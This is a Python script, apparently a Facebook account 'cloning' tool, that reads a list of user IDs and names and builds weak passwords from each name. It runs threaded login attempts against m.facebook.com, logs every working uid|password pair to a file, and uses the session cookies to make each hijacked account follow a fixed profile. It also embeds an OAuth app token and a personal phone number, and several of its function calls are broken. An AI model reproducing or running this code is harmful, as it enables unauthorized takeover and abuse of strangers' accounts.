#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as Jadussb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36 OPR/63.3.3216.58675i]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo=""" ___________ MR_Mani____________
____________________________________________
github   : Mrmani10
Facebook : MANI DCRUZE
YouTube  : Mrmani10
Whatsapp : 03112137937
-----------------------------------------------------
       \x1b[1;92m  USE FLIGHT MOOD Every 10 minutes
-----------------------------------------------------"""

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    nt('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mDaNi_OK.txt' % (H, P, str(len(ok))))
	    #print(' \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mDaNi_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Jadu Menu ")
	    Jadu()


def Kashif():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File Cloning')
    print(' [2] exit ')
    print('')
    _Jadu___ = input(' [?] Choose option : ')
    if _Jadu___ in ('1', '01'):
        __xxx__().Jadux(id)
    if _Jadu___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def Jadux(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            prnt(' [!] Choose Correct One');
            self.Jadux(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r \033[1;92m[Mani] {loop}/{len(self.id)} OK={len(ok)}-CP={len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {'authority': 'm.facebook.com',
    'method': 'GET',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'sec-ch-ua': '^\^Not_A',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '^\^Windows^^',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',}
                r = session.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',  headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {'authority': 'm.facebook.com',
    'method': 'POST',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvO5XxBAmd3ArMAu7',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'sec-ch-ua': '^\^Not_A',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '^\^Windows^^',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-fb-lsd': 'AVpQaGyebwA',
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',
    'x_fb_background_state': '1',}
                po = session.post('https://m.facebook.com/a/bz?fb_dtsg=NAcOPRDFINoQYB6CQuDBBo5p7jOKX_2Md-ERAEMUNo-NlKJqecq9MfA^%^3A0^%^3A0&jazoest=24639&lsd=AVpQaGyebwA&__dyn=0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw&__csr=&__req=1&__a=AYnXuvNIAiGhU87lQWLjaU8mXht1ObngyeqJChBWmfi_1qxu8Zh3LJ0lvIcE5uJcmNqvkX5mrZVSHwUSlWuHpEFlnPqD9NAcIXfd3q3hghq4UA&__user=0', data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [Jadu-ok] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Jadu-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/okiew.you', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://free.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
              
    def __pler__(self):
        print('[1] Crack With 2 pass Fast ')
        
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking  EnjoY...')
            print(47*"-")
            with Jadussb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                        else:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"12345"]                        
                        
                        ssbworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass
            hasl(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            p1 = input(' 1 : ')
            os.system("clear")
            print(logo)
            pri('\033[1;37m Total IDs : %s ' % len(self.id))
            #print('\033[1;37m Cracking Started...')
            print(47*"-")
            with Jadussb(max_workers=30) as ssbworld:
                #for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [p1]
                        else:
                            pwx = [p1]
                        ssbworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

Kashif()

